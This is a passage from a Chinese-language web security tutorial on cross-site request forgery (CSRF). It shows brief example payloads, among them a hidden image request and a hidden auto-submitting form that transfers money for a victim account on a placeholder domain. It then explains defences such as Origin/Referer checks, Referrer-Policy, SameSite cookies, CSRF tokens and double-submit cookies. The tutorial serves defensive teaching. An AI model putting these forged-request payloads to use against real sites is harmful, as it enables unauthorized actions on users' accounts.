例如利用隐藏图片自动发起一个HTTP请求,会自动附带用户cookies

```abnf
<img style="width:0;" src="https://www.test.com/xxx" />
```

### POST请求

例如利用隐藏表单自动提交

```abnf
<form action="https://www.test.com/xxx" method=POST>
    <input type="hidden" name="account" value="xiaoming" />
    <input type="hidden" name="amount" value="10000" />
</form>
<script> document.forms[0].submit(); </script> 
```

### URL攻击

比较常见的利诱广告方式或者冒充QQ病毒警告等引诱用户自己点击

```routeros
<a href="https://www.test.com/xxx" taget="_blank">
  一刀9999级,神级装备,顶级神宠,开服就有！！
<a/>
```



## 防御：限制访问名单

### 同源检测

HTTP协议中一般会携带两个带有来源信息的字段:

#### Origin

指示了请求来自于哪个站点。该字段仅指示服务器名称，并不包含任何路径信息, 用于 CORS 请求或者 POST 请求。Origin在以下两种情况下并不存在：

- IE 11 不会在跨站CORS请求上添加Origin标头
- 302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。

#### Referer

包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 Referer 首部识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等。

- 对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。
- 对于页面跳转，Referer为打开页面历史记录的前一个页面地址

在以下情况下，`Referer` 不会被发送：

- 来源页面采用的协议为表示本地文件的 "file" 或者 "data" URI
- 当前请求页面采用的是非安全协议，而来源页面采用的是安全协议（HTTPS）

虽然HTTP有明确要求,也有Referrer Policy草案对浏览器如何发送做了详细规定,但是浏览器实现可能有差别,不能保障安全性.低版本浏览器,Flash等情况可能丢失或不可信,新的Referrer规定了五种策略：

| States                     | 作用                                                         |
| -------------------------- | ------------------------------------------------------------ |
| no-Referrer                | 任何情况下都不发送Referrer信息                               |
| no-Referrer-when-downgrade | 仅当协议降级（如HTTPS页面引入HTTP资源）时不发送Referrer信息。是大部分浏览器默认策略 |
| origin                     | 发送只包含host部分的referrer.                                |
| origin-when-cross-origin   | 仅在发生跨域访问时发送只包含host的Referer，同域下还是完整的。与Origin Only的区别是多判断了是否Cross-origin。协议、域名和端口都一致，浏览器才认为是同域 |
| unsafe-url                 | 全部都发送Referrer信息。最宽松最不安全的策略                 |

设置Referrer Policy的方法有:

- 在HTTP的CSP（Content Security Policy）设置

  ```pgsql
  Content-Security-Policy: referrer no-referrer|no-referrer-when-downgrade|origin|origin-when-cross-origin|unsafe-url;
  ```

- 页面头部增加meta标签, 默认no-referer策略

  ```routeros
  <meta name="referrer" content="no-referrer|no-referrer-when-downgrade|origin|origin-when-crossorigin|unsafe-url">
  ```

- a标签增加Referrer Policy属性,只支持三种

  ```routeros
  <a href="http://example.com" referrer="no-referrer|origin|unsafe-url">xxx</a>
  ```

发起请求的来源域名可能是网站本域，或者子域名，或者有授权的第三方域名，又或者来自不可信的未知域名。业务上需要针对各种情况作出过滤规则,一般优先使用`Origin`确认来源信息就够了,`Referrer `变数太多比较适合打辅助.但是如果两者都获取不到的情况下,建议直接进行阻止.

同源规则能简单防范大多数CSRF攻击,配合关键接口做额外处理能更好提高安全性.

### SameSite

一种新的防止跨站点请求伪造（cross site request forgery）的 http 安全特性。该值可以设置为 `Strict` 或 `Lax`,现阶段只有部分主流浏览器支持,仅做了解即可

```routeros
Set-Cookie: key=value; SameSite=Strict/Lax
```

- Strict: 跨域请求或者新标签重新打开都不会携带该Cokies
- Lax: 这个请求是（改变了当前页面或者打开了新页面）且同时是个GET请求，则携带。

还有一个比较严重的问题是SameSite不支持子域名.

## 防御：附加验证

### 验证码

通过图形验证码或者手机验证码或者邮箱验证等多种方式强制用户进行交互可以有效遏制CSRF攻击,缺点是步骤比较繁琐,只适用于如涉及金额,密码相关等关键请求,

### CSRF Token

基于攻击者无法获得用户信息的特性,我们可以在前后端交互中携带一个有效验证“令牌”来防范CSRF攻击,大概流程:

1. 当用户首次登录成功之后, 服务端会生成一个唯一性和随机性的 token 值保存在服务器的Session或者其他缓存系统中，再将这个token值返回给浏览器；
2. 浏览器拿到 token 值之后本地保存；
3. 当浏览器再次发送网络请求的时候,就会将这个 token 值附带到参数中(或者通过Header头)发送给服务端；
4. 服务端接收到浏览器的请求之后,会取出token值与保存在服务器的Session的token值做对比验证其正确性和有效期。

在大型网站一般使用多台服务器,用户请求经过负载均衡器路由到具体的服务器上,如果使用Session默认储存在单机服务器内存中,在分布式环境下同一用户的多次请求可能会指向不同的服务器上,而其他的服务器无法共享Session导致Session机制失效无法验证,所以分布式集群中Token需要储存在Redis等公共储存空间.

因为读取和验证Token会有复杂度和性能的问题,还有种方式采用Encrypted Token Pattern方式,通常是使用UserID、时间戳和随机数，通过加密的方法生成而非随机性,之后请求校验不需要读取而是直接计算即可,这样既可以保证分布式服务的Token一致，又能保证Token不容易被破解。

### 双重Cookie验证

相较于CSRF Token,这种方式比较简单实现但是安全性较低.大概流程:

1. 用户访问页面之后域名被注入随机字符串Cookie
2. 浏览器发起请求时会取出该Cookie字符串添加到URL参数中
3. 服务端验证是否一致

没有大规模应用除了安全性问题还有一个就是跨域可能导致获取不到Cookie.

1. 用户访问网站域名`www.test.com`,服务端api域名`api.test.com`,
2. 如果想要共用Cookie就必须注入到`test.com`,然后子域名都能获取到
3. 同理每个子域名都能修改该Cookie,如果某个子域名被攻击了
4. 攻击者可以自己配置一个Cookie破解双重Cookie验证机制拦截
